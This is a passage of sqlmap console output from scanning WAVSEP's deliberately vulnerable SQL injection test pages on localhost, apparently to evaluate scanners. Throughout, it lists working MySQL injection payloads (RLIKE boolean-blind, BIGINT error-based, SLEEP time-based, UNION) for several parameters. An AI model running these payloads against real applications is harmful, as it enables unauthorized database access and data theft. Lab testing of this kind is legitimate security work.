[04:49:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:49:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:49:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:49:56] [INFO] GET parameter 'msgId' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:49:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:49:56] [INFO] GET parameter 'msgId' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:49:56] [INFO] testing 'MySQL inline queries'
[04:49:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:49:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:49:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:49:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:49:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:49:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:49:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:50:06] [INFO] GET parameter 'msgId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:50:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:50:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:50:06] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:50:06] [INFO] target URL appears to have 3 columns in query
[04:50:06] [INFO] GET parameter 'msgId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'msgId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 796 HTTP(s) requests:
---
Parameter: msgId (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msgId=1 RLIKE (SELECT (CASE WHEN (1824=1824) THEN 1 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msgId=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a6b6a71,(SELECT (ELT(8161=8161,1))),0x7171626a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgId=1 AND (SELECT 5154 FROM (SELECT(SLEEP(5)))dwNy)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: msgId=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6b6a71,0x5451614a7a4e6a6354447570754a6e70784b626e556e50556a5953655a495178616c525370504279,0x7171626a71)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:50:06] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[27/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp?minBalanace=10000
do you want to test this URL? [Y/n/q]
> Y
[04:50:06] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp?minBalanace=10000'                                                                                                        
[04:50:06] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=F1A9D759CAD...3DFF238BC4'). Do you want to use those [Y/n] Y
[04:50:06] [INFO] testing if GET parameter 'minBalanace' is dynamic
[04:50:06] [WARNING] GET parameter 'minBalanace' does not appear to be dynamic
[04:50:06] [INFO] heuristic (basic) test shows that GET parameter 'minBalanace' might be injectable (possible DBMS: 'MySQL')
[04:50:06] [INFO] heuristic (XSS) test shows that GET parameter 'minBalanace' might be vulnerable to cross-site scripting (XSS) attacks
[04:50:06] [INFO] testing for SQL injection on GET parameter 'minBalanace'
[04:50:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:50:06] [WARNING] reflective value(s) found and filtering out
[04:50:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:50:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:50:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:50:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:50:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:50:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:50:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:50:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:50:09] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:50:09] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:50:09] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:50:09] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:50:09] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:50:09] [INFO] testing 'Generic inline queries'
[04:50:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:50:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:50:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:50:10] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:50:10] [INFO] GET parameter 'minBalanace' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:50:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:50:10] [INFO] GET parameter 'minBalanace' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:50:10] [INFO] testing 'MySQL inline queries'
[04:50:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:50:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:50:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:50:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:50:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:50:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:50:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:50:20] [INFO] GET parameter 'minBalanace' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:50:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:50:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:50:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:50:20] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[04:50:20] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:50:20] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:50:20] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:50:20] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:50:20] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:50:21] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:50:21] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:50:21] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:50:21] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:50:21] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:50:22] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'minBalanace' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1189 HTTP(s) requests:
---
Parameter: minBalanace (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: minBalanace=10000 RLIKE (SELECT (CASE WHEN (9295=9295) THEN 10000 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: minBalanace=10000 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162706b71,(SELECT (ELT(7144=7144,1))),0x71786a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: minBalanace=10000 AND (SELECT 5784 FROM (SELECT(SLEEP(5)))zIuQ)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:50:22] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[28/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp?msgid=1
do you want to test this URL? [Y/n/q]
> Y
[04:50:22] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp?msgid=1'                                                                                                              
[04:50:22] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=E1872B99E31...9D9C64702A'). Do you want to use those [Y/n] Y
[04:50:22] [INFO] testing if GET parameter 'msgid' is dynamic
[04:50:22] [WARNING] GET parameter 'msgid' does not appear to be dynamic
[04:50:22] [INFO] heuristic (basic) test shows that GET parameter 'msgid' might be injectable (possible DBMS: 'MySQL')
[04:50:22] [INFO] heuristic (XSS) test shows that GET parameter 'msgid' might be vulnerable to cross-site scripting (XSS) attacks
[04:50:22] [INFO] testing for SQL injection on GET parameter 'msgid'
[04:50:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:50:22] [WARNING] reflective value(s) found and filtering out
[04:50:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:50:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:50:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:50:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:50:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:50:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:50:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:50:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:50:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:50:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:50:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:50:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:50:24] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:50:25] [INFO] testing 'Generic inline queries'
[04:50:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:50:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:50:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:50:26] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:50:26] [INFO] GET parameter 'msgid' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:50:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:50:26] [INFO] GET parameter 'msgid' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:50:26] [INFO] testing 'MySQL inline queries'
[04:50:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:50:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:50:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:50:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:50:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:50:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:50:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:50:36] [INFO] GET parameter 'msgid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:50:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:50:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:50:36] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:50:36] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:50:36] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:50:36] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:50:36] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:50:36] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:50:36] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:50:37] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:50:37] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:50:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:50:37] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:50:37] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:50:37] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:50:37] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:50:37] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:50:37] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:50:38] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:50:38] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:50:38] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'msgid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1173 HTTP(s) requests:
---
Parameter: msgid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msgid=1 RLIKE (SELECT (CASE WHEN (9633=9633) THEN 1 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msgid=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a7a6b71,(SELECT (ELT(1471=1471,1))),0x7170716a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgid=1 AND (SELECT 3946 FROM (SELECT(SLEEP(5)))MaUL)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:50:38] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[29/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp?orderby=1
do you want to test this URL? [Y/n/q]
> Y
[04:50:38] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp?orderby=1'                                                                                         
[04:50:38] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=1A77BEF72A9...0A20E6BC53'). Do you want to use those [Y/n] Y
[04:50:38] [INFO] testing if GET parameter 'orderby' is dynamic
[04:50:38] [WARNING] GET parameter 'orderby' does not appear to be dynamic
[04:50:38] [INFO] heuristic (basic) test shows that GET parameter 'orderby' might be injectable (possible DBMS: 'MySQL')
[04:50:38] [INFO] heuristic (XSS) test shows that GET parameter 'orderby' might be vulnerable to cross-site scripting (XSS) attacks
[04:50:38] [INFO] testing for SQL injection on GET parameter 'orderby'
[04:50:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:50:38] [WARNING] reflective value(s) found and filtering out
[04:50:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:50:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:50:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:50:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:50:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:50:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:50:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:50:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:50:41] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:50:41] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:50:41] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:50:41] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:50:41] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:50:41] [INFO] testing 'Generic inline queries'
[04:50:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:50:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:50:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:50:42] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:50:42] [INFO] GET parameter 'orderby' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:50:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:50:42] [INFO] GET parameter 'orderby' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:50:42] [INFO] testing 'MySQL inline queries'
[04:50:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:50:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:50:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:50:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:50:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:50:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:50:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:50:52] [INFO] GET parameter 'orderby' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:50:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:50:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:50:52] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:50:52] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:50:52] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:50:52] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:50:52] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:50:52] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:50:52] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:50:52] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:50:52] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:50:53] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'orderby' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1176 HTTP(s) requests:
---
Parameter: orderby (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: orderby=1 RLIKE (SELECT (CASE WHEN (1713=1713) THEN 1 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: orderby=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a6b7171,(SELECT (ELT(2530=2530,1))),0x716b766a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: orderby=1 AND (SELECT 2589 FROM (SELECT(SLEEP(5)))Pqbv)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:50:53] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[30/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[04:50:54] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp?transactionDate=2010-01-01'                                                                                                
[04:50:54] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=F35D27501A3...821E32C0D0'). Do you want to use those [Y/n] Y
[04:50:54] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:50:54] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:50:54] [INFO] heuristic (basic) test shows that GET parameter 'transactionDate' might be injectable (possible DBMS: 'MySQL')
[04:50:54] [INFO] heuristic (XSS) test shows that GET parameter 'transactionDate' might be vulnerable to cross-site scripting (XSS) attacks
[04:50:54] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:50:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:50:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:50:54] [WARNING] reflective value(s) found and filtering out
[04:50:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:50:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:50:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:50:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:50:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:50:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:50:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:50:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:50:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:50:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:50:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:50:56] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:50:57] [INFO] testing 'Generic inline queries'
[04:50:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:50:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:50:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:50:57] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:50:57] [INFO] GET parameter 'transactionDate' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:50:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:50:57] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:50:57] [INFO] testing 'MySQL inline queries'
[04:50:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:50:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:50:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:50:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:50:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:50:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:50:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:51:07] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:51:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:51:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:51:07] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:51:07] [INFO] target URL appears to have 4 columns in query
[04:51:07] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[04:51:07] [WARNING] automatically patching output having last char trimmed
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 800 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: transactionDate=2010-01-01' RLIKE (SELECT (CASE WHEN (6758=6758) THEN 0x323031302d30312d3031 ELSE 0x28 END))-- tLuD

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-01-01' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178767671,(SELECT (ELT(1881=1881,1))),0x71716b6a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- BAtT

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 7645 FROM (SELECT(SLEEP(5)))aGxg)-- EdBB

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
